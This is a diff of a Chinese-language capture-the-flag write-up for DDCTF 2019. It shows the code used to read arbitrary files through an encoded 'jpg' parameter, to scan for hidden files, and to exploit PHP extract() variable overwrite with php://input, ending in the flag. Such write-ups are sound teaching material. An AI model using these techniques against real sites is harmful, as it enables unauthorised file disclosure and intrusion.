@@ -1,10 +1,13 @@
 # DDCTF-2019 Writeups
+> Node.js 选手的 DDCTF 2019 WP
 
-## 0x00
-TODO
+## 0x00. Intro
+上周侄子 ~~（对呀我就是老年组选手~~ 发来 [一个链接](https://ddctf.didichuxing.com/)，发现是类似十多年前 [CSKSoft](http://www.csksoft.net) 高手挑战 ([1](http://www.csksoft.net/netcompet1/game1.htm), [2](http://www.csksoft.net/NetCompet2/)) 的游戏，才知道原来现在 [CTF](https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security) 氛围这么好，后知后觉之余仿佛打开了新世界的大门。
 
-## Web 0x01 滴
+
+## 0x01. Web 1 - 滴
 ### 题目
+> 滴~  
 > http://117.51.150.246  
 
 ### 解题过程
@@ -14,7 +17,7 @@ TODO
 http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09
 ```
 
-HTTP 包数据:
+拿到访问目标地址的 HTTP 包数据:
 
 ```http
 GET /index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 HTTP/1.1
@@ -42,7 +45,7 @@ Content-Type: text/html;charset=utf-8
 <title>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</title>flag.jpg</br>flag.jpg</br><img src='data:image/gif;base64,/9j/4AAQSkZ...'></img>
 ```
 
-QueryString 中 `jpg` 的值看起来似乎经过了 base64 编码，于是直接在浏览器的 console 里尝试对其解码：
+看起来 QueryString 中 `jpg` 的值似乎经过了 base64 编码，于是直接在浏览器的 console 里尝试对其解码：
 
 ```javascript
 atob('TmpZMlF6WXhOamN5UlRaQk56QTJOdz09')
@@ -56,7 +59,7 @@ atob(atob('TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'))
 // <- "666C61672E6A7067"
 ```
 
-解出的值像是 HEX，尝试在 Node.js 里转成字符串：
+解出的值像是 Hex，尝试用 Node.js 转成字符串：
 
 ```javascript
 Buffer.from('666C61672E6A7067', 'hex').toString()
@@ -65,7 +68,7 @@ Buffer.from('666C61672E6A7067', 'hex').toString()
 
 嗯哼~ 得到的值与响应体中输出的 `flag.jpg` 一致，猜测可以通过修改 `jpg` 的值输出指定文件内容。
 
-构造读取当前页面 (`index.php`) 源文件的地址：
+那么首先构造出读取当前页面 (`index.php`) 源文件的地址：
 
 ```javascript
 const { base64 } = require('../common/utils')
@@ -79,7 +82,7 @@ let url = `http://117.51.150.246/index.php?jpg=${encode('index.php')}`
 // <- "http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3"
 ```
 
-访问该地址，发现页面上的字符串已经变成 `index.php`；提出 `<img>` 的 `src` 值并进行 base64 解码，得出 [源文件内容](./web/1/vendors/index.php)：
+访问该地址，发现页面上的字符串已经变成 `index.php`；然后提取出 `<img>` 的 `src` 值并做 base64 解码，便成功得到 [源文件内容](./web/1/vendors/index.php)：
 
 ```php
 <?php
@@ -121,7 +124,7 @@ Review 代码后可以了解到：
 3. 目前所能做的事情仅有读取指定文件，但我们仍未知道应该读取哪个文件。
 
 那么剩下的线索只有 [文件头部注释的链接](https://blog.csdn.net/FengBanLiuYun/article/details/80616607) 了。
-指过去的是 CSDN 的一篇博客 —— 「命令 echo」，但很明显此 `echo` 非 `index.php` 中的 `echo`，所以博文内容并没有包含什么有用的信息。 ~~（倒是评论区已经开始「打卡」并「暴打出题人」了。~~
+指过去的是 CSDN 的一篇博客 —— 「命令 echo」，但很明显此 `echo` 非 `index.php` 中的 `echo`，所以博文内容并没有包含什么有用的信息。 ~~（倒是评论区已经开始「打卡」并「暴打出题人」了~~
 
 于是尝试暴力扫描可能命中的文件，这里用 Node.js 快速写个脚本：
 
@@ -249,7 +252,7 @@ curl -s https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/a64f510/dic
 
 但依旧扫不到新的文件。
 
-~~那么这题至此就可以放弃了。~~
+~~那么这题至此又可以放弃了。~~
 
 在被这道关卡卡住一天之后，看着 `index.php` 中的 `</br>`，我鬼使神差地意识到出题人也许还犯了其他低级错误。于是把扫描脚本改为：
 
@@ -286,25 +289,19 @@ curl -s https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/a64f510/dic
 
 惊了。
 
-心情复杂.jpg
+心情复杂.jpg  
 ~~我替黄旭东祝滴滴越办越好~~
 
-无论如何，我终于还是拿到了下一个线索 `flag!ddctf.php`。
-结合前面对 `index.php` 的分析，这一步就显得非常简单了：
+无论如何，终于还是拿到了下一个线索 `flag!ddctf.php`。
+结合前面对 `index.php` 的解读，这一步就显得非常简单了：
 
 ```javascript
-const { base64 } = require('../common/utils')
-
-function encode (filename) {
-  let hex = Buffer.from(filename).toString('hex')
-  return base64.encode(base64.encode(hex))
-}
-
+// ...
 let url = `http://117.51.150.246/index.php?jpg=${encode('flagconfigddctf.php')}`
 // <- "http://117.51.150.246/index.php?jpg=TmpZMll6WXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ=="
 ```
 
-用同样的方法获取到 `flag!ddctf.php` 的内容：
+再用与前面相同的方法 —— 提取 `<img>` 的 `src`，并做 base64 解码；便轻松获取到了 `flag!ddctf.php` 的内容：
 
 ```php
 <?php
@@ -327,11 +324,11 @@ if(isset($uid))
 ?>
 ```
 
-这里涉及两个常见的 PHP 的安全问题：
+Review 后发现这里涉及两个 ~~CTF~~ 常见的 PHP 的安全问题：
 1. [extract() 变量覆盖](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract)
 2. [远程文件包含 - PHP 流 input](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_3)
 
-构造请求参数 `k=php://input`，使 `$content` 值等于 Request Body 的内容；并把相同的值（如 `yelo`）传入参数 `uid` 和 Request Body：
+构造请求参数 `k=php://input`，使 `$content` 值等于 Request Body 的内容；并把相同的值（如 `yelo`）传入参数 `uid` 和 Request Body；使得最终 `$uid == $content`：
 
 ```javascript
 const got = require('got')
@@ -346,11 +343,11 @@ const got = require('got')
 })()
 ```
 
-获得 flag `"DDCTF{436f6e67726174756c6174696f6e73}"`。
-
+获得 flag `"DDCTF{436f6e67726174756c6174696f6e73}"`，成功通关。
 
 ## Web 0x02 WEB 签到题
 ### 题目
+> WEB 签到题  
 > http://117.51.158.44/index.php
 
 ### 解题过程
